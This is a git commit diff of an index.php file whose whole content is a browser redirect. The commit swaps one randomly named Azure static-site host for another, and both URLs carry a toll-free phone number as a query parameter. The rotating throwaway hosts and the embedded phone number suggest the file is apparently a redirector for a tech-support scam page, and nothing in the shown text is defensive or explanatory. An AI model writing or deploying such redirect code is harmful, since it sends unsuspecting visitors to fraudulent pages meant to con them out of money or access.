2785ddf2c6625ec1972d73616601f468e75e6663
mancillajoaquin204 <mancillajoaquin204@gmail.com>
2025-06-03 19:24:48 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <?php
 
 // Redirect browser
-header("Location: https://sinkiubeucdnid8sjdw3sdw3.z38.web.core.windows.net/index.html?Aniph=1-888-667-5901");
+header("Location: https://cessed3efe4fewsv324fewf3.z1.web.core.windows.net/index.html?Aniph=1-888-667-5901");
 
 exit;
 ?>
